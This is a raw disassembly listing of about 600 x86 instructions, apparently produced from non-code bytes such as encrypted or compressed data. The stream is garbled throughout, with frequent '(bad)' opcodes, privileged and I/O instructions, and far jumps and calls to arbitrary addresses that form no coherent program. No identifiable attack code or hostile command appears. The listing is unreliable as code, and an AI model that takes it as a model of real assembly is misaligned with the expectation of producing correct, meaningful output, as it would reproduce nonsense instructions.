  41b1fe:	(bad)  
  41b1ff:	xchg   ebx,eax
  41b200:	xchg   ebx,eax
  41b202:	sub    BYTE PTR [ebx+ebx*8+0x44],0x44
  41b207:	sbb    cl,BYTE PTR [ebx-0xae93934]
  41b20d:	js     0x41b251
  41b20f:	jp     0x41b279
  41b211:	dec    BYTE PTR [edi+edi*4+0x7c]
  41b215:	cmp    eax,0x5b927219
  41b21a:	lds    ecx,FWORD PTR ds:0x6c5e91c1
  41b220:	jmp    0x773f99af
  41b225:	mov    ah,0xd0
  41b227:	add    DWORD PTR [ebx+0x695b6b21],ebp
  41b22d:	jns    0x41b2a6
  41b22f:	cmp    ebx,DWORD PTR [ebp+0x5e]
  41b232:	mov    al,ds:0x9dc77edc
  41b237:	cmp    BYTE PTR ds:[ebp+0x26dea3d1],cl
  41b23e:	push   es
  41b23f:	sahf   
  41b240:	aam    0x79
  41b242:	sbb    dl,BYTE PTR [esi+0x28cc1ed8]
  41b248:	push   edi
  41b249:	xchg   DWORD PTR [edi],ebx
  41b24b:	mov    edi,0xde29c04a
  41b250:	mov    al,ds:0x607e1cbf
  41b255:	addr16 pushf 
  41b257:	pop    ecx
  41b258:	mov    ebp,0x9bc1de35
  41b25d:	icebp  
  41b25e:	fmul   st,st(1)
  41b260:	push   ds
  41b261:	add    BYTE PTR [esi-0x1d680421],dh
  41b267:	xor    esp,edi
  41b269:	mov    esi,0xc50d33b7
  41b26e:	fistp  QWORD PTR [ebx+0x61]
  41b271:	add    ebx,DWORD PTR [eax]
  41b273:	(bad)  
  41b274:	(bad)
  41b278:	clc    
  41b279:	jo     0x41b21b
  41b27b:	mov    al,BYTE PTR [esi-0x62]
  41b27e:	jb     0x41b261
  41b280:	mov    al,ds:0x238b917c
  41b285:	push   ecx
  41b286:	mov    al,0xe3
  41b288:	iret   
  41b289:	add    edi,0x968f44b1
  41b28f:	aam    0xd9
  41b291:	jae    0x41b2d3
  41b293:	neg    DWORD PTR [ecx-0x37a5759c]
  41b299:	lods   al,BYTE PTR ds:[esi]
  41b29a:	mov    eax,0x313c7534
  41b29f:	mov    esi,0x93219fd4
  41b2a4:	dec    ecx
  41b2a5:	ja     0x41b2f2
  41b2a7:	fldenv [edx]
  41b2a9:	pop    esi
  41b2aa:	sub    eax,0x111103e6
  41b2af:	inc    eax
  41b2b0:	xchg   ebx,eax
  41b2b1:	mov    dh,0x9c
  41b2b3:	jbe    0x41b2a9
  41b2b5:	push   ss
  41b2b6:	lds    esp,FWORD PTR [edi-0x4f79b864]
  41b2bc:	aam    0xb4
  41b2be:	shr    BYTE PTR [ecx+0x71b75aa2],cl
  41b2c4:	cmp    ebx,edi
  41b2c6:	dec    ebp
  41b2c7:	xor    bh,BYTE PTR [eax+ebx*4]
  41b2ca:	in     eax,0x19
  41b2cc:	pop    edx
  41b2cd:	adc    eax,0xe532a6ba
  41b2d2:	fiadd  WORD PTR ds:0x1e71eb74
  41b2d8:	shl    DWORD PTR [ebx],1
  41b2da:	leave  
  41b2db:	mov    dh,0xa5
  41b2dd:	scas   al,BYTE PTR es:[edi]
  41b2de:	shl    BYTE PTR [edx],cl
  41b2e0:	jge    0x41b361
  41b2e2:	mov    dh,ah
  41b2e4:	jnp    0x41b28a
  41b2e6:	pop    edx
  41b2e7:	(bad)  
  41b2e8:	loop   0x41b325
  41b2ea:	pop    es
  41b2eb:	xor    ch,BYTE PTR [edx]
  41b2ed:	sbb    DWORD PTR [edi-0x1],edx
  41b2f0:	(bad)  ds:0x4da665e6
  41b2f6:	sub    al,BYTE PTR [ecx-0x7b]
  41b2f9:	das    
  41b2fa:	push   ss
  41b2fb:	jo     0x41b346
  41b2fd:	dec    ebp
  41b2fe:	scas   eax,DWORD PTR es:[edi]
  41b2ff:	int    0x1e
  41b301:	mov    ds:0x4c1541bd,al
  41b306:	scas   al,BYTE PTR es:[edi]
  41b307:	sub    eax,DWORD PTR [ecx+0x2c0289e8]
  41b30d:	and    eax,0x7507b6fb
  41b312:	push   es
  41b313:	sbb    BYTE PTR [edi+0x3875ce83],dh
  41b319:	xchg   BYTE PTR [esi+0x3],bh
  41b31c:	push   edi
  41b31d:	ror    DWORD PTR ds:0x66228d76,cl
  41b323:	push   0xffffffe9
  41b325:	retf   0xa76e
  41b328:	add    DWORD PTR es:[esi],edi
  41b32b:	sbb    al,0x8a
  41b32d:	xchg   edx,eax
  41b32e:	or     DWORD PTR ds:[ebp-0x1c2b23f5],edi
  41b335:	dec    ecx
  41b336:	mov    esp,0xb5a3e909
  41b33b:	mov    ebx,eax
  41b33d:	lods   eax,DWORD PTR ds:[esi]
  41b33e:	data16 jp 0x41b3ba
  41b341:	(bad)  
  41b342:	mov    ch,0xc3
  41b344:	pop    es
  41b345:	mov    dl,0x50
  41b347:	push   ecx
  41b348:	imul   edi,DWORD PTR [ecx+0x7a2586ef],0xffffff81
  41b34f:	sti    
  41b350:	jg     0x41b33d
  41b352:	push   es
  41b353:	mov    bh,0xa1
  41b355:	popf   
  41b356:	std    
  41b357:	xchg   edx,eax
  41b358:	mov    ecx,0xaa796a12
  41b35d:	imul   ebp,DWORD PTR [esp+edi*1-0x4b],0xd77f6390
  41b365:	cdq    
  41b366:	jmp    0x300b:0x7d6b2128
  41b36d:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b36f:	push   ebp
  41b370:	inc    edi
  41b371:	or     eax,0x31643989
  41b376:	repnz icebp 
  41b378:	jge    0x41b3e4
  41b37a:	dec    eax
  41b37b:	clc    
  41b37c:	jne    0x41b305
  41b37e:	push   es
  41b37f:	pop    esp
  41b380:	mov    ch,0xd6
  41b382:	leave  
  41b383:	push   es
  41b384:	add    DWORD PTR ds:0x51945607,edi
  41b38a:	cmp    esp,DWORD PTR [edx+0x30]
  41b38d:	mov    ebp,0xa4a23ca5
  41b392:	cmp    edi,ebx
  41b394:	sub    ch,al
  41b396:	enter  0x7c18,0xf9
  41b39a:	shl    cl,0x31
  41b39d:	mov    eax,ds:0xd100803f
  41b3a2:	xchg   edx,eax
  41b3a3:	rcr    bl,1
  41b3a5:	pop    edi
  41b3a6:	sub    esp,DWORD PTR [esi+ebx*1+0x31]
  41b3aa:	adc    eax,0x81bb925c
  41b3af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b3b0:	repz mov ah,0x2d
  41b3b3:	mov    ds:0x952daef0,eax
  41b3b8:	inc    ecx
  41b3b9:	xor    al,0x5c
  41b3bb:	cmp    eax,0x1cf53067
  41b3c0:	jge    0x41b438
  41b3c2:	test   al,0x15
  41b3c4:	popa   
  41b3c5:	jle    0x41b393
  41b3c7:	and    edx,DWORD PTR [eax]
  41b3c9:	ret    
  41b3ca:	std    
  41b3cb:	aaa    
  41b3cc:	or     ebx,DWORD PTR [edx-0x50]
  41b3cf:	(bad)
  41b3d4:	sub    ecx,DWORD PTR [eax]
  41b3d6:	int    0x39
  41b3d8:	in     al,dx
  41b3d9:	(bad)  
  41b3db:	mov    ds,WORD PTR [edi+0x6]
  41b3de:	mov    eax,ds:0xdac51875
  41b3e3:	bound  ebp,QWORD PTR [edi+0xf]
  41b3e6:	js     0x41b429
  41b3e8:	mov    edi,0x1696de45
  41b3ed:	ja     0x41b397
  41b3ef:	addr16 mov esi,0xc30c4c4b
  41b3f5:	call   0xd13a:0x1a1e9829
  41b3fc:	in     eax,0x7b
  41b3fe:	aam    0x8a
  41b400:	sub    al,cl
  41b402:	pop    ebx
  41b403:	aas    
  41b404:	and    cl,dl
  41b406:	adc    DWORD PTR ds:0xe0b1b4bf,ebp
  41b40c:	sti    
  41b40d:	xchg   BYTE PTR [esi+eax*4-0x26],ah
  41b411:	out    0x4c,eax
  41b413:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b414:	sbb    al,0x6f
  41b416:	scas   eax,DWORD PTR es:[edi]
  41b417:	jg     0x41b3b9
  41b419:	mov    dl,0x45
  41b41b:	dec    ecx
  41b41c:	add    dl,BYTE PTR [esp+edx*8]
  41b41f:	stos   DWORD PTR es:[edi],eax
  41b420:	push   ebp
  41b421:	push   cs
  41b422:	pop    eax
  41b423:	sub    eax,0x7d5ff265
  41b428:	retf   0x831e
  41b42b:	mov    eax,ds:0xe1487ae1
  41b430:	dec    eax
  41b431:	(bad)  
  41b432:	fsubr  st,st(3)
  41b434:	aad    0x7e
  41b436:	jno    0x41b415
  41b438:	pushf  
  41b439:	xor    BYTE PTR [esi-0x787c4613],ch
  41b43f:	test   al,0x75
  41b441:	lods   al,BYTE PTR ds:[esi]
  41b442:	sahf   
  41b443:	mov    dh,BYTE PTR [eax-0x36cbce33]
  41b449:	mul    BYTE PTR [ecx+0x38]
  41b44c:	add    edx,0x424471ad
  41b452:	lock mov al,ds:0x91f02525
  41b458:	fisub  DWORD PTR [esi-0x26]
  41b45b:	jno    0x41b470
  41b45d:	and    eax,edx
  41b45f:	sbb    ecx,DWORD PTR [eax+0x7426bdef]
  41b465:	hlt    
  41b466:	lahf   
  41b467:	add    al,0x79
  41b469:	sbb    DWORD PTR [edi+edi*1],eax
  41b46c:	ror    DWORD PTR [edx+0x774217a5],0xae
  41b473:	inc    esp
  41b474:	and    al,0x89
  41b476:	ret    0x394
  41b479:	jmp    0x1c8ad178
  41b47e:	add    ch,ah
  41b480:	mov    ebp,0xf30b1eeb
  41b485:	sar    BYTE PTR [ebx+0x1a],cl
  41b488:	inc    edx
  41b489:	retf   
  41b48a:	outs   dx,BYTE PTR ds:[esi]
  41b48b:	enter  0x8441,0xe7
  41b48f:	pop    eax
  41b490:	ja     0x41b426
  41b492:	add    edx,DWORD PTR [edx-0x13]
  41b495:	sti    
  41b496:	mov    ch,bl
  41b498:	jge    0x41b454
  41b49a:	dec    eax
  41b49b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b49c:	jne    0x41b4eb
  41b49e:	adc    eax,0xbc7392c6
  41b4a3:	jne    0x41b480
  41b4a5:	sub    edi,DWORD PTR [ecx-0x6]
  41b4a8:	or     DWORD PTR [esi+0x665e312c],ecx
  41b4ae:	jg     0x41b49e
  41b4b0:	(bad)  
  41b4b1:	icebp  
  41b4b2:	pusha  
  41b4b3:	mov    ecx,0x129f1198
  41b4b8:	jo     0x41b459
  41b4ba:	outs   dx,DWORD PTR ds:[esi]
  41b4bb:	sbb    al,0xf4
  41b4bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b4be:	push   ss
  41b4bf:	mov    ds:0x2b388b31,eax
  41b4c4:	test   BYTE PTR [ebx],bh
  41b4c6:	xor    al,0x35
  41b4c8:	loope  0x41b483
  41b4ca:	outs   dx,DWORD PTR ds:[esi]
  41b4cb:	mov    esp,0xc532a0e5
  41b4d0:	mov    cl,BYTE PTR [edx]
  41b4d2:	call   0xdab90c1c
  41b4d7:	icebp  
  41b4d8:	sbb    al,0x8b
  41b4da:	add    ch,BYTE PTR [ebx-0x18a62a98]
  41b4e0:	push   esp
  41b4e1:	ret    
  41b4e2:	add    DWORD PTR [esi-0x19],ebp
  41b4e5:	add    bh,dl
  41b4e7:	nop
  41b4e8:	jo     0x41b478
  41b4ea:	mov    bh,0xbf
  41b4ec:	repz and al,0x86
  41b4ef:	cmp    DWORD PTR [eax+0x15],esp
  41b4f2:	fdivrp st(3),st
  41b4f4:	mov    ebp,0x1152b09f
  41b4f9:	jne    0x41b513
  41b4fb:	fsub   st,st(4)
  41b4fd:	jo     0x41b529
  41b4ff:	aam    0xa7
  41b501:	bound  esp,QWORD PTR [edx]
  41b503:	aam    0x5c
  41b505:	pop    edx
  41b506:	or     al,0x1
  41b508:	mov    dl,0x8d
  41b50a:	lods   al,BYTE PTR ds:[esi]
  41b50b:	out    dx,al
  41b50c:	mov    ds:0x674fd9b6,al
  41b511:	data16 mov BYTE PTR [ecx-0x40],ah
  41b515:	push   ss
  41b516:	es or  eax,0x7cbc6cfc
  41b51c:	stos   BYTE PTR es:[edi],al
  41b51d:	cmp    esp,esi
  41b51f:	fidivr WORD PTR [esi]
  41b521:	or     ebx,DWORD PTR [edx+edi*1+0x3]
  41b525:	pop    edi
  41b526:	cmp    DWORD PTR ds:0xcc8c448f,esp
  41b52c:	lods   eax,DWORD PTR ds:[esi]
  41b52d:	popa   
  41b52e:	inc    ecx
  41b52f:	out    dx,eax
  41b530:	shl    DWORD PTR [ebx-0x6a],0x7
  41b534:	push   es
  41b535:	inc    eax
  41b536:	sub    al,0xc9
  41b538:	sub    eax,0xe61731f8
  41b53d:	stc    
  41b53e:	test   eax,0xb8fbe2d2
  41b543:	adc    DWORD PTR [edi],eax
  41b545:	fwait
  41b546:	retf   
  41b547:	fcom   st(7)
  41b549:	push   ds
  41b54a:	loopne 0x41b52c
  41b54c:	scas   eax,DWORD PTR es:[edi]
  41b54d:	jmp    0xd6e23d33
  41b552:	xchg   esi,eax
  41b553:	xchg   esi,eax
  41b554:	mov    eax,0xfc2518a8
  41b559:	or     DWORD PTR [ebp-0x14b5c883],0xffffffb8
  41b560:	data16 add cl,BYTE PTR [ecx+0x70]
  41b564:	jbe    0x41b5cf
  41b566:	inc    edx
  41b567:	and    eax,ecx
  41b569:	adc    BYTE PTR [ebx],dl
  41b56b:	xlat   BYTE PTR ds:[ebx]
  41b56c:	sar    dl,cl
  41b56e:	pop    ecx
  41b56f:	in     al,dx
  41b570:	sbb    BYTE PTR [ebx],bl
  41b572:	repz (bad) 
  41b574:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b575:	daa    
  41b576:	jge    0x41b568
  41b578:	es jae 0x41b5b7
  41b57b:	or     edi,ebx
  41b57d:	pop    DWORD PTR [ebp-0x75]
  41b580:	jecxz  0x41b54e
  41b582:	imul   ebp,DWORD PTR [eax],0x10
  41b585:	fnstcw WORD PTR [edi+ebx*8-0x5394f7d1]
  41b58c:	or     DWORD PTR [eax],0x7b7239fd
  41b592:	or     BYTE PTR [edx],0x90
  41b595:	xor    al,0x2e
  41b597:	(bad)  
  41b598:	mov    bl,0xeb
  41b59a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b59b:	mov    ?,edx
  41b59d:	add    DWORD PTR [edx+0x49],esi
  41b5a0:	hlt    
  41b5a1:	stos   BYTE PTR es:[edi],al
  41b5a2:	sub    eax,0x8ff37ec6
  41b5a7:	sti    
  41b5a8:	inc    eax
  41b5a9:	icebp  
  41b5aa:	mov    dl,0xe1
  41b5ac:	ret    0x4ef
  41b5af:	mov    gs:0xdbbb044c,al
  41b5b5:	cld    
  41b5b6:	push   es
  41b5b7:	xor    DWORD PTR [ebx-0x41ec5767],esp
  41b5bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b5be:	cdq    
  41b5bf:	scas   eax,DWORD PTR es:[edi]
  41b5c0:	in     al,dx
  41b5c1:	sbb    BYTE PTR [eax-0x27],bl
  41b5c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b5c5:	shr    bl,cl
  41b5c7:	sub    DWORD PTR [eax+0x69],ebp
  41b5ca:	mov    eax,0x229a0b85
  41b5cf:	aad    0x13
  41b5d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b5d2:	pop    es
  41b5d3:	in     eax,dx
  41b5d4:	add    ebx,esp
  41b5d6:	sbb    eax,0xd9b08800
  41b5db:	pushf  
  41b5dc:	cmp    cl,bh
  41b5de:	cdq    
  41b5df:	jecxz  0x41b566
  41b5e1:	or     eax,0xad20a1cd
  41b5e6:	inc    esi
  41b5e7:	scas   al,BYTE PTR es:[edi]
  41b5e8:	mov    ah,0xd3
  41b5ea:	fnstenv ds:0x5470f2e6
  41b5f0:	scas   al,BYTE PTR es:[edi]
  41b5f1:	pop    es
  41b5f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b5f3:	mov    gs,ebp
  41b5f5:	mov    eax,ds:0xab38bef9
  41b5fa:	fsincos 
  41b5fc:	mov    cl,0x6f
  41b5fe:	inc    ebx
  41b5ff:	repz xor eax,0x8c663f40
  41b605:	ficom  WORD PTR [ecx]
  41b607:	ins    DWORD PTR es:[edi],dx
  41b608:	sbb    edi,DWORD PTR [ecx-0x17]
  41b60b:	std    
  41b60c:	mov    dl,0x88
  41b60e:	adc    ax,0xb34f
  41b612:	pushf  
  41b613:	dec    edi
  41b614:	mov    cl,0xcd
  41b616:	or     edi,edx
  41b618:	push   ecx
  41b619:	clc    
  41b61a:	retf   0x80fc
  41b61d:	adc    ecx,DWORD PTR [esi-0x4a]
  41b620:	push   ebx
  41b621:	xchg   edi,eax
  41b622:	cwde   
  41b623:	mov    esi,0x191a28da
  41b628:	mov    al,0x14
  41b62a:	adc    esp,DWORD PTR [ebx+0x72a5a610]
  41b630:	mov    DWORD PTR [ebp+0x2e],esi
  41b633:	and    bh,0x7c
  41b636:	hlt    
  41b637:	pop    ds
  41b638:	dec    edi
  41b639:	mov    ecx,0xf3d3b57b
  41b63e:	pushf  
  41b63f:	sbb    bh,dl
  41b641:	and    al,0x2f
  41b643:	or     DWORD PTR [ecx],ebx
  41b645:	scas   eax,DWORD PTR es:[edi]
  41b646:	cmp    ch,BYTE PTR [edi-0x4b]
  41b649:	stc    
  41b64a:	cmc    
  41b64b:	loop   0x41b62d
  41b64d:	add    eax,0xd475688e
  41b652:	test   eax,0xc7c181e4
  41b657:	nop
  41b658:	sub    BYTE PTR [ecx+0x35],bh
  41b65b:	dec    edi
  41b65c:	pop    esi
  41b65d:	mov    bh,0x23
  41b65f:	mov    eax,ds:0x2f758575
  41b664:	jmp    0x64eb35c1
  41b669:	into   
  41b66a:	aad    0x40
  41b66c:	xchg   BYTE PTR [edx],dh
  41b66e:	dec    esp
  41b66f:	mov    ds:0x5276261c,al
  41b674:	pop    ecx
  41b675:	loope  0x41b670
  41b677:	lods   al,BYTE PTR ds:[esi]
  41b678:	add    esp,DWORD PTR ds:0x4a8f85f2
  41b67e:	and    BYTE PTR [esi-0x27bfecaf],bl
  41b684:	mov    eax,DWORD PTR [bp+si+0x2bd1]
  41b689:	dec    edi
  41b68a:	bound  edi,QWORD PTR [ebx]
  41b68c:	add    esp,DWORD PTR [ebp+0xeb4535]
  41b692:	fsubr  DWORD PTR [eax+0x2c]
  41b695:	mov    DWORD PTR [edx+esi*1+0x5391094f],ecx
  41b69c:	icebp  
  41b69d:	add    DWORD PTR [ebx-0x8],ebp
  41b6a0:	push   edx
  41b6a1:	aaa    
  41b6a2:	sub    al,0xde
  41b6a4:	fwait
  41b6a5:	jbe    0x41b68a
  41b6a7:	lock outs dx,BYTE PTR ds:[esi]
  41b6a9:	or     eax,0xc96f32ca
  41b6ae:	sbb    al,0x12
  41b6b0:	arpl   WORD PTR [ebx],si
  41b6b2:	xchg   edx,esp
  41b6b4:	lock and eax,0x6c7dd198
  41b6ba:	xor    BYTE PTR [esi-0x1520bfb7],dh
  41b6c0:	mov    bh,0x7
  41b6c2:	sti    
  41b6c3:	cmp    eax,0x5b389b25
  41b6c8:	push   esi
  41b6c9:	popa   
  41b6ca:	add    BYTE PTR [ebp-0x28],ch
  41b6cd:	xchg   edx,eax
  41b6ce:	jne    0x41b6ba
  41b6d0:	loopne 0x41b6a1
  41b6d2:	jae    0x41b694
  41b6d4:	jnp    0x41b72d
  41b6d6:	mov    cl,0x43
  41b6d8:	jno    0x41b6d9
  41b6da:	mov    ah,0xa1
  41b6dc:	int    0xea
  41b6de:	ret    0x4eff
  41b6e1:	popf   
  41b6e2:	mov    dl,dh
  41b6e4:	mov    dh,0x1f
  41b6e6:	mov    ebx,0x52e59dc2
  41b6eb:	cmp    DWORD PTR [eax],esi
  41b6ed:	je     0x41b748
  41b6ef:	jmp    0x1098eb98
  41b6f4:	inc    esp
  41b6f5:	and    eax,0x9212ff8
  41b6fa:	sbb    bl,BYTE PTR [edx+0x14]
  41b6fd:	retf   
  41b6fe:	xchg   edi,eax
  41b6ff:	pop    ebp
  41b700:	jno    0x41b6bb
  41b702:	fcom   QWORD PTR [edx]
  41b704:	mov    cs,WORD PTR [edi+ebx*2-0x5b]
  41b708:	aas    
  41b709:	jns    0x41b783
  41b70b:	pop    esi
  41b70c:	xchg   ebx,eax
  41b70d:	out    dx,al
  41b70e:	cmc    
  41b70f:	pop    es
  41b710:	fild   WORD PTR [edi-0x6867d72f]
  41b716:	jge    0x41b761
  41b718:	fwait
  41b719:	daa    
  41b71a:	cmp    ebx,0xffffffee
  41b71d:	mov    eax,ds:0x1621faee
  41b722:	mov    ecx,0x69ef71a
  41b727:	cli    
  41b728:	out    0xd8,al
  41b72a:	mov    esi,0x2068994b
  41b72f:	dec    eax
  41b730:	mov    ds:0x81087408,eax
  41b735:	push   es
  41b736:	pop    edi
  41b737:	cwde   
  41b738:	sbb    bl,0xde
  41b73b:	mov    al,ds:0xfc55d8d0
  41b740:	pop    ecx
  41b741:	cmp    ch,BYTE PTR [esi]
  41b743:	loope  0x41b6d7
  41b745:	(bad)  
  41b746:	call   0xccbf:0x4a338336
  41b74d:	adc    eax,0x740bfff1
  41b752:	(bad)  
  41b753:	mov    dl,0x2b
  41b755:	push   ss
  41b756:	pop    ds
  41b757:	arpl   ax,di
  41b759:	cmp    ebp,eax
  41b75b:	push   0xa9db3871
  41b760:	lea    ebp,[edx-0x11c724de]
  41b766:	xchg   ecx,eax
  41b767:	les    ebx,FWORD PTR gs:[bx-0x64]
  41b76c:	jo     0x41b740
  41b76e:	pop    ss
  41b76f:	paddsw mm2,QWORD PTR [esi-0x49]
  41b773:	xor    BYTE PTR ds:0x713d6f9,cl
  41b779:	and    DWORD PTR [edi+0x5e],eax
  41b77c:	mov    ebp,0x9917f488
  41b781:	test   DWORD PTR [edx+0x46],0x7d999fce
  41b788:	xchg   esp,eax
  41b789:	xor    eax,0x38e36986
  41b78e:	sub    ecx,DWORD PTR [ecx-0xc]
  41b791:	mov    bh,0xe
  41b793:	sub    eax,0x31d6ce42
  41b798:	ss test al,0xd8
  41b79b:	(bad)  
  41b79c:	cdq    
  41b79d:	ds cwde 
  41b79f:	ja     0x41b7b7
  41b7a1:	sbb    BYTE PTR [edi-0x19],cl
  41b7a4:	ds out dx,eax
  41b7a6:	cmp    DWORD PTR [eax-0x32],ebx
  41b7a9:	lods   eax,DWORD PTR ds:[esi]
  41b7aa:	cmp    eax,DWORD PTR [edi-0x7c]
  41b7ad:	mov    bh,0xec
  41b7af:	or     DWORD PTR [eax+0x589baa8c],edx
  41b7b5:	dec    eax
  41b7b6:	daa    
  41b7b7:	xlat   BYTE PTR ds:[ebx]
  41b7b8:	inc    ebx
  41b7b9:	inc    eax
  41b7ba:	jl     0x41b805
  41b7bc:	loopne 0x41b80b
  41b7be:	jle    0x41b755
  41b7c0:	pusha  
  41b7c1:	mov    ds:0x925fba1,eax
  41b7c6:	ins    DWORD PTR es:[edi],dx
  41b7c7:	(bad)  
  41b7c8:	cld    
  41b7c9:	and    al,0x18
  41b7cb:	fisubr WORD PTR [eax-0x5f]
  41b7ce:	inc    eax
  41b7cf:	push   esp
  41b7d0:	cs xor al,0x2c
  41b7d3:	jmp    0x41b836
  41b7d5:	es dec ebx
  41b7d7:	or     al,0x7d
  41b7d9:	lock fmul QWORD PTR [esi-0x5d250485]
  41b7e0:	dec    eax
  41b7e1:	mov    ah,0xfe
  41b7e3:	repz inc edi
  41b7e5:	mov    ah,0xf6
  41b7e7:	repnz xchg edi,eax
  41b7e9:	and    DWORD PTR [edx+eax*8-0x1f2e9ea3],esp
  41b7f0:	jge    0x41b79a
  41b7f2:	dec    eax
  41b7f3:	xchg   DWORD PTR [ebx],ebx
  41b7f5:	mov    bh,BYTE PTR [ebx+0x1d]
  41b7f8:	wrmsr  
  41b7fa:	mov    bh,BYTE PTR [ebx]
  41b7fc:	and    DWORD PTR [edx-0x41071d46],edi
  41b802:	paddsb mm7,QWORD PTR [esi]
  41b805:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b806:	push   ss
  41b807:	mov    ebp,0x4006c5b5
  41b80c:	pop    ds
  41b80d:	cs mov cs,ebx
  41b810:	mov    dh,0xf1
  41b812:	cmp    esp,DWORD PTR [eax+0x668ce3f9]
  41b818:	push   cs
  41b819:	jg     0x41b824
  41b81b:	pusha  
  41b81c:	jne    0x41b861
  41b81e:	jne    0x41b83f
  41b820:	pop    es
  41b821:	pop    ebx
  41b822:	js     0x41b839
  41b824:	push   edi
  41b825:	mov    cl,al
  41b827:	cmp    ecx,DWORD PTR [ebx]
  41b829:	ins    DWORD PTR es:[edi],dx
  41b82a:	add    al,0x5a
  41b82c:	std    
  41b82d:	into   
  41b82e:	dec    esi
  41b82f:	mov    esp,0x4524695f
  41b834:	push   0x8d314503
  41b839:	repnz call 0xfccf:0x9d6e6aea
  41b841:	lods   eax,DWORD PTR ds:[esi]
  41b842:	shr    BYTE PTR [ebp-0x234fc5d5],cl
  41b848:	mov    edx,0x9df2b01c
  41b84d:	mov    edx,0x9c19d29a
  41b852:	mov    eax,0xd41dfa48
  41b857:	jmp    0x41b80c
  41b859:	pop    esp
  41b85a:	ficom  DWORD PTR [esi]
  41b85c:	adc    al,0xd5
  41b85e:	or     eax,0x4d31b1af
  41b863:	xchg   edi,eax
  41b864:	push   ss
  41b865:	cli    
  41b866:	(bad)  
  41b867:	adc    ah,BYTE PTR [eax-0x1202aced]
  41b86d:	ficom  WORD PTR [ebp+0xd56822c]
  41b873:	sbb    dh,BYTE PTR [esi-0x298dd3aa]
  41b879:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b87a:	mov    ecx,0x3311cb21
  41b87f:	jle    0x41b865
  41b881:	add    dl,BYTE PTR [ebx-0x50d6d469]
  41b887:	mov    eax,ds:0x621d4601
  41b88c:	(bad)  
  41b88d:	loope  0x41b8df
  41b88f:	and    BYTE PTR [eax+0x2f49212e],0x57
  41b896:	mov    bl,0x60
  41b898:	scas   eax,DWORD PTR es:[edi]
  41b899:	inc    ebx
  41b89a:	hlt    
  41b89b:	add    BYTE PTR [ecx+0x5aa39151],bh
  41b8a1:	outs   dx,DWORD PTR ds:[esi]
  41b8a2:	iret   
  41b8a3:	push   0x2
  41b8a5:	ds push esp
  41b8a7:	(bad)  
  41b8a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b8aa:	jge    0x41b853
  41b8ac:	pop    eax
  41b8ad:	mov    BYTE PTR [eax+eiz*1-0x721231af],cl
  41b8b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b8b5:	pop    eax
  41b8b6:	and    DWORD PTR [ebx+0x5c],ecx
  41b8b9:	mov    bl,bh
  41b8bb:	cld    
  41b8bc:	sub    esi,ecx
  41b8be:	push   edx
  41b8bf:	jb     0x41b88d
  41b8c1:	jge    0x41b919
  41b8c3:	lods   al,BYTE PTR ds:[esi]
  41b8c4:	mov    eax,ds:0xef1cb0af
  41b8c9:	adc    ah,BYTE PTR [edi-0x4f1af1be]
  41b8cf:	lods   eax,DWORD PTR ds:[esi]
  41b8d0:	push   eax
  41b8d1:	je     0x41b8e8
  41b8d3:	jo     0x41b8fb
  41b8d5:	sub    al,0xcd
  41b8d7:	mov    al,ds:0x16935df5
  41b8dc:	jnp    0x41b8ee
  41b8de:	or     eax,ecx
  41b8e0:	lods   al,BYTE PTR ds:[esi]
  41b8e1:	pop    edx
  41b8e2:	sbb    DWORD PTR [ebx+0x1ef9ab86],edx
  41b8e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b8e9:	jl     0x41b88a
  41b8eb:	aad    0x2f
  41b8ed:	xor    al,0xf
  41b8ef:	popa   
  41b8f0:	repz xchg esi,eax
  41b8f2:	and    edx,DWORD PTR [edi+edi*4]
  41b8f5:	adc    eax,0xe31981c1
  41b8fa:	das    
  41b8fb:	push   eax
  41b8fc:	mov    eax,0xd0e50f40
  41b901:	inc    ecx
  41b902:	jns    0x41b914
  41b904:	push   edi
  41b905:	add    esi,ebp
  41b907:	lea    esi,[ebx-0x52]
  41b90a:	sbb    DWORD PTR [ebp-0x5dfa86ae],eax
  41b910:	pop    edi
  41b911:	ret    
  41b912:	mov    dl,0x19
  41b914:	sbb    ebx,DWORD PTR [eax]
  41b916:	out    0x6a,eax
  41b918:	out    0x21,al
  41b91a:	imul   edi,DWORD PTR [eax],0x3d3dad60
  41b920:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b921:	outs   dx,BYTE PTR ds:[esi]
  41b922:	test   al,dl
  41b924:	in     eax,0xb2
  41b926:	pop    ebp
  41b927:	push   edi
  41b928:	pop    es
  41b929:	jmp    0xc279:0xa3901f61
  41b930:	xor    DWORD PTR [edx],0x79
  41b933:	(bad)  
  41b935:	add    BYTE PTR [ecx-0x1c71dacf],0x89
  41b93c:	arpl   sp,cx
  41b93e:	pushf  
  41b93f:	leave  
  41b940:	out    0x5e,eax
  41b942:	rol    DWORD PTR [ebx],0x56
  41b945:	and    eax,0x7625fd53
  41b94a:	xor    esp,0xfffffff0
  41b94d:	and    BYTE PTR ss:[eax+0x6f],bh
  41b951:	mov    ebx,0x8e4dc2c
  41b956:	pop    edx
  41b957:	and    eax,0x9026ca69
  41b95c:	mov    cl,0xf0
  41b95f:	or     edi,esi
  41b961:	test   eax,0xbf8fa008
  41b966:	stc    
  41b967:	mov    edx,0x14d781c7
  41b96c:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  41b96e:	or     edi,edx
  41b970:	rcr    DWORD PTR [edx],1
  41b972:	push   esi
  41b973:	shr    DWORD PTR [ecx-0x1b],cl
  41b976:	bound  ebx,QWORD PTR [edx+0x77882430]
  41b97c:	mov    ebx,0xbbf53a53
  41b981:	repnz icebp 
  41b983:	cmp    eax,0x247666a8
  41b988:	or     cl,bl
